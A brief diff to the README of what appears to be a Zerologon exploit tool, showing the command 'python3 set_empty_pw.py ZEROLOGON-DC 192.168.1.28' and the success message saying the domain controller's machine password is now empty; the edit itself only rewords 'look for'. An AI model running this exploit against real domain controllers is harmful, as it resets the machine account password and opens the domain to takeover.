@@ -46,7 +46,8 @@ python3 set_empty_pw.py \<NetBIOS-name\> \<IP-Address\>
 ```
 python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28
 ```
-look for:
+looking for:
+
 Success! DC should now have the empty string as its machine password.
 
 
